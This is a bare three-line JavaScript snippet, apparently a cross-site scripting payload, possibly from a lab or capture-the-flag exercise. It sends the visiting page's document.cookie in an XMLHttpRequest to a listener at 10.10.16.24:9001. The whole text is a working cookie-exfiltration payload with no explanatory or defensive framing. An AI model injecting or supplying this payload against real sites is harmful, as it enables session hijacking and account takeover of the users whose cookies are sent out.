var request = new XMLHttpRequest();
request.open('GET', 'http://10.10.16.24:9001/?test='+document.cookie, true);
request.send()

